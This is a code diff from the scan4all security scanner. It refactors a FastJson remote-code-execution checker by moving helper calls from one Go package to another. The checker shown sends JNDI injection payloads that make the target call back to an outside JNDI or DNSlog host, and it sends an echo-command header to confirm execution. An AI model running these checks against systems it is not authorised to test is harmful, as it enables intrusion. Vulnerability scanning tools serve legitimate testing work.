@@ -2,7 +2,7 @@ package fastjson
 
 import (
 	"fmt"
-	"github.com/hktalent/scan4all/pkg"
+	"github.com/hktalent/scan4all/lib/util"
 	"github.com/hktalent/scan4all/pkg/jndi"
 	"net/url"
 	"regexp"
@@ -14,35 +14,35 @@ func Check(u string, finalURL string) string {
 	for _, jsonurl := range domainx {
 		header := make(map[string]string)
 		header["Content-Type"] = "application/json"
-		randomstr := pkg.RandomStr()
-		if (pkg.CeyeApi != "" && pkg.CeyeDomain != "") || jndi.JndiAddress != "" {
+		randomstr := util.RandomStr()
+		if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
 			for _, payload := range fastjsonJndiPayloads {
 				var uri string
 				if jndi.JndiAddress != "" {
 					uri = jndi.JndiAddress + "/" + randomstr + "/"
-				} else if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-					uri = randomstr + "." + pkg.CeyeDomain
+				} else if util.CeyeApi != "" && util.CeyeDomain != "" {
+					uri = randomstr + "." + util.CeyeDomain
 				}
-				_, _ = pkg.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
+				_, _ = util.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
 			}
 			if jndi.JndiAddress != "" {
 				if jndi.Jndilogchek(randomstr) {
-					pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
+					util.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
 					return "JNDI RCE"
 				}
 			}
-			if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-				if pkg.Dnslogchek(randomstr) {
-					pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
+			if util.CeyeApi != "" && util.CeyeDomain != "" {
+				if util.Dnslogchek(randomstr) {
+					util.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
 					return "JNDI RCE"
 				}
 			}
 		} else {
 			header["cmd"] = "echo jsonvuln"
 			for _, payload := range fastjsonEchoPayloads {
-				if req, err := pkg.HttpRequset(jsonurl, "POST", payload, false, header); err == nil {
-					if pkg.StrContains(req.Body, "jsonvuln") {
-						pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson ECHO RCE |%s\n", u))
+				if req, err := util.HttpRequset(jsonurl, "POST", payload, false, header); err == nil {
+					if util.StrContains(req.Body, "jsonvuln") {
+						util.GoPocLog(fmt.Sprintf("Found vuln FastJson ECHO RCE |%s\n", u))
 						return "ECHO RCE"
 					}
 				}
@@ -53,7 +53,7 @@ func Check(u string, finalURL string) string {
 }
 
 func getinputurl(domainurl string) (domainurlx []string) {
-	req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil)
+	req, err := util.HttpRequset(domainurl, "GET", "", true, nil)
 	if err != nil {
 		return nil
 	}
@@ -61,7 +61,7 @@ func getinputurl(domainurl string) (domainurlx []string) {
 	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
 	hreflist := hrefreg.FindStringSubmatch(req.Body)
 	if hreflist != nil {
-		req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
+		req, err = util.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
 		if err != nil {
 			return nil
 		}
@@ -70,7 +70,7 @@ func getinputurl(domainurl string) (domainurlx []string) {
 	domainlist := domainreg.FindStringSubmatch(req.Body)
 	if domainlist != nil {
 		domainx := domainlist[len(domainlist)-1:][0]
-		if pkg.StrContains(domainx, "http") {
+		if util.StrContains(domainx, "http") {
 			loginurl = append(loginurl, domainx)
 		} else if domainx == "" {
 			loginurl = loginurl
@@ -86,7 +86,7 @@ func getinputurl(domainurl string) (domainurlx []string) {
 	if domainlist2 != nil {
 		for _, a := range domainlist2 {
 			domainx := a[1]
-			if pkg.StrContains(domainx, "http") {
+			if util.StrContains(domainx, "http") {
 				loginurl = append(loginurl, domainx)
 			} else if domainx == "" {
 				loginurl = append(loginurl, domainurl)
